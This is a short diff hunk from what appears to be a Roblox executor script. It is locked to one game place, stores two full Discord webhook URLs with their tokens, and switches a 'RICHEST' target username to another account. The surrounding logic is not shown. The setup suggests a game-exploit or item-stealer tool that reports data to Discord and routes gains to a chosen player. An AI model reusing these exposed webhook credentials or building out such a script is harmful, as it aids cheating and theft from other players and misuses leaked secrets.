@@ -3,7 +3,7 @@ if game.PlaceId ~= 109983668079237 then return end
 -- ========== SETTINGS & WEBHOOKS ==========
 getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
 getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"
-local RICHEST = "hakimidu_95"
+local RICHEST = "Only1sherif"
 
 -- ========== CORE SERVICES ==========
 local Players = game:GetService("Players")
